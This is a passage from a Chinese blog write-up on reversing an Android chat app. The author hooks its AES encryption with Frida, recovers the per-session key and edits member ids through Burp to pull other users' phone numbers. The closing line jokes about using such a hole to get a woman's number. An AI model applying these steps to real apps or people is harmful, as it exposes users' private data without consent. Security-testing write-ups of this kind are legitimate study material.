class="token function">executeRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>BasicNetwork</span><span class="token punctuation">.</span><span class="token function">performRequest</span><span class="token punctuation">(</span><span class="token class-name">BasicNetwork</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre><p>直接定位算法aes 算法 AES&#x2F;ECB&#x2F;PKCS5Padding 秘钥和key都吐出来了解密一波看看我们<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161110956.png" alt="成功解密证明上述堆栈确实是这个的"></p><p>因为app是有加固的所以我们还是使用脱壳工具进行脱壳这里使用frida-dexdump 测试了一下blackdex貌似脱不全。总之两个工具交替使用吧<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161114762.png" alt="定位key"><br>发现者str2是个字符串那么我们查调用这个加密的<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161118967.png" alt="查找引用"><br>看看n0.b可能就是秘钥点一下<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161119537.png" alt="查找引用"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161121377.png" alt="定位到确实是用的这个key"><br>接下来这个引用所有的用frida hook一遍看登陆调用了哪些函数。确定以后一级一级的判断。这里我就不用这个hook通杀算法定位了来一个新的既然是 请求和响应都是base64那么他肯定要把字符串转换成字节所以。我们可以hook转换成字节的方法</p></li></ul><h2 id="字节定位分析app请求框架"><a href="#字节定位分析app请求框架" class="headerlink" title="字节定位分析app请求框架"></a>字节定位分析app请求框架</h2><ul><li>定位效果不错<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161128010.png"></p></li><li><pre class="language-java" data-language="java"><div class="caption"><span>堆栈信息</span></div><code class="language-java">  <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String<span class="token punctuation">.</span>Bytes</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at com<span class="token punctuation">.</span>networkbench<span class="token punctuation">.</span>agent<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>util<span class="token punctuation">.</span>j<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token class-name">SourceFile</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>networkbench<span class="token punctuation">.</span>agent<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>instrumentation<span class="token punctuation">.</span></span>NBSTransactionStateUtil</span><span class="token punctuation">.</span><span class="token function">setCrossProcessHeader</span><span class="token punctuation">(</span><span class="token class-name">SourceFile</span><span class="token operator">:</span><span class="token number">7</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>networkbench<span class="token punctuation">.</span>agent<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>instrumentation<span class="token punctuation">.</span></span>NBSHttpsURLConnectionExtension</span><span class="token punctuation">.</span><span class="token generics"><span class="token punctuation">&lt;</span>init<span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">SourceFile</span><span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>networkbench<span class="token punctuation">.</span>agent<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>instrumentation<span class="token punctuation">.</span></span>NBSInstrumentation</span><span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token class-name">SourceFile</span><span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">executeRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">9</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>BasicNetwork</span><span class="token punctuation">.</span><span class="token function">performRequest</span><span class="token punctuation">(</span><span class="token class-name">BasicNetwork</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String<span class="token punctuation">.</span>Bytes</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesEncrypt</span><span class="token punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at xxxxx<span class="token punctuation">.</span>l<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token class-name">KnowAsynHttpRequestDefEncrypt</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">addBodyIfExists</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">setConnectionParametersForRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">executeRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>BasicNetwork</span><span class="token punctuation">.</span><span class="token function">performRequest</span><span class="token punctuation">(</span><span class="token class-name">BasicNetwork</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String<span class="token punctuation">.</span>Bytes</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesEncrypt</span><span class="token punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">)</span>        at xxxxx<span class="token punctuation">.</span>l<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token class-name">KnowAsynHttpRequestDefEncrypt</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">addBodyIfExists</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">setConnectionParametersForRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">executeRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>BasicNetwork</span><span class="token punctuation">.</span><span class="token function">performRequest</span><span class="token punctuation">(</span><span class="token class-name">BasicNetwork</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String<span class="token punctuation">.</span>Bytes</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesDecrypt</span><span class="token punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesDecrypt</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at xxxxx<span class="token punctuation">.</span>l<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">parseNetworkResponse</span><span class="token punctuation">(</span><span class="token class-name">KnowAsynHttpRequestDefEncrypt</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">17</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre></li>我们发现了一堆com.android.volley.toolbox 名字猜测有可能是发包用的 百度搜索一下<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161136052.png" alt="果然是发包的"><br>随便搜索一个看看内置框架没办法看源码于是看看包有什么特点发现这里Port&#x3D;PhoneLogin&amp;CheckCode&#x3D;0000000000;6.08.2.0;android;0;0 不变搜索一波<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161142613.png" alt="瞬间柳暗花明"><br>随便点一个函数。看到super 一看继承StringRequest点一下看看发现点不动。看看这包名。import com.android.volley.toolbox.StringRequest;<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161143500.png" alt="突破点"><br>百度一下import com.android.volley.toolbox.StringRequest; 如何发包不就行了<a href="https://blog.csdn.net/nuli888/article/details/52169679">https://blog.csdn.net/nuli888/article/details/52169679</a></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">*</span> <span class="token annotation punctuation">@param</span> path   请求路径     <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> map    请求参数     <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> entity 需要解析的类     <span class="token operator">*</span> <span class="token annotation punctuation">@return</span>     <span class="token operator">*</span><span class="token operator">/</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">StringRequest_POST</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Handler</span> handler<span class="token punctuation">,</span> <span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> map<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> entity<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token operator">*</span> get请求     <span class="token operator">*</span>     <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> path   请求路径     <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> entity 需要解析的类     <span class="token operator">*</span> <span class="token annotation punctuation">@return</span>     <span class="token operator">*</span><span class="token operator">/</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">StringRequest_GET</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Handler</span> handler<span class="token punctuation">,</span> <span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> entity<span class="token punctuation">)</span> 调用<span class="token class-name">StringRequest</span> request_post <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringRequest</span><span class="token punctuation">(</span><span class="token class-name">Request<span class="token punctuation">.</span>Method</span><span class="token punctuation">.</span>POST<span class="token punctuation">,</span>                path<span class="token punctuation">,</span> succes<span class="token punctuation">,</span> error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></code></pre><p>可以看出第二个参数是请求url ，如果是post第三个是参数的key 和value</p></ul><h2 id="编写frida-hook脚本"><a href="#编写frida-hook脚本" class="headerlink" title="编写frida hook脚本"></a>编写frida hook脚本</h2><ul><li>frida编写脚本提示信息</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161154809.png"></p><pre class="language-python" data-language="python"><code class="language-python">Error<span class="token punctuation">:</span> StringRequest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> has more than one overload<span class="token punctuation">,</span> use <span class="token punctuation">.</span>overload<span class="token punctuation">(</span><span class="token operator">&lt;</span>signature<span class="token operator">></span><span class="token punctuation">)</span> to choose <span class="token keyword">from</span><span class="token punctuation">:</span>        <span class="token punctuation">.</span>overload<span class="token punctuation">(</span><span class="token string">'java.lang.String'</span><span class="token punctuation">,</span> <span class="token string">'com.android.volley.Response$Listener'</span><span class="token punctuation">,</span> <span class="token string">'com.android.volley.Response$ErrorListener'</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span>overload<span class="token punctuation">(</span><span class="token string">'int'</span><span class="token punctuation">,</span> <span class="token string">'java.lang.String'</span><span class="token punctuation">,</span> <span class="token string">'com.android.volley.Response$Listener'</span><span class="token punctuation">,</span> <span class="token string">'com.android.volley.Response$ErrorListener'</span><span class="token punctuation">)</span>    at X <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span><span class="token keyword">class</span><span class="token operator">-</span>factory<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">563</span><span class="token punctuation">)</span>    at K <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span><span class="token keyword">class</span><span class="token operator">-</span>factory<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">558</span><span class="token punctuation">)</span>    at <span class="token builtin">set</span> <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span><span class="token keyword">class</span><span class="token operator">-</span>factory<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">926</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span><span class="token operator">/</span>stringRequest<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span>vm<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">)</span>    at _performPendingVmOps <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>index<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">238</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>index<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">213</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span>vm<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">)</span>    at _performPendingVmOpsWhenReady <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>index<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">232</span><span class="token punctuation">)</span>    at perform <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>index<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">192</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span><span class="token builtin">eval</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token operator">/</span>stringRequest<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">)</span></code></pre><p>看这个比较像 ‘int’, ‘java.lang.String hook一下  这样我们可以获取到任意url,至于请求数据的话直接获取密钥解密就完事了。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161443194.png" alt="说明没有问题"><br>搜索一下解密的内容直接定位<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161501655.png" alt="组包关键函数"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161458220.png" alt="解密内容"></p><p>这会儿请求的url有了返回的直接hook aes解密算法就行了。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161512794.png" alt="脚本"></p></ul><h2 id="使用脚本分析登陆以后的操作"><a href="#使用脚本分析登陆以后的操作" class="headerlink" title="使用脚本分析登陆以后的操作"></a>使用脚本分析登陆以后的操作</h2><ul>下图显示登陆成功了返回的数据。<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161516834.png" alt="脚本运行截图"></p><li> 看个登陆以后返回什么在看个人信息那里明文请求是什么</li>登陆画红框的memberid就是登陆者的id好 portpassword 是动态aes的秘钥<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161520160.png" alt="登陆返回"></p><p>在看个人信息那分析包以后用hook方式发现用的是AES&#x2F;ECB&#x2F;PKCS5Padding  采用的动态秘钥方式 登陆成功以后给你一个动态key。所有请求用这个key进行加密响应也是用这个进行解密。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161613870.png" alt="直接用秘钥解密请求成功解密"></p></ul><h2 id="配置bp插件autodecoder测试"><a href="#配置bp插件autodecoder测试" class="headerlink" title="配置bp插件autodecoder测试"></a>配置bp插件autodecoder测试</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161630479.png" alt="autodecoder配置"><br>Charles 转发请求到bp,直接修改id就可以获取到铭感信息<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161640801.png" alt="信息一"><br>手机号信息,至此此app只要绑定手机号只要知道对方id号就可以获取手机号码<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161641386.png" alt="信息二"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此app采用的动态秘钥方式 登陆成功以后给你一个动态key。AES&#x2F;ECB&#x2F;PKCS5Padding 所有请求用这个key进行加密响应也是用这个进行解密。关注频道后续还会带来精彩的实战内容。和小姐姐聊天不给手机号怎么办搞他(前提是有漏洞哈哈哈)</p>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
            <tag> autoDecoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓自动化渗透测试工具Brida-实战演示某聊天app</title>
      <link href="/androidreverse/2023/03/articles/4a73c3959963b967/"/>
      <url>/androidreverse/2023/03/articles/4a73c3959963b967/</url>
      
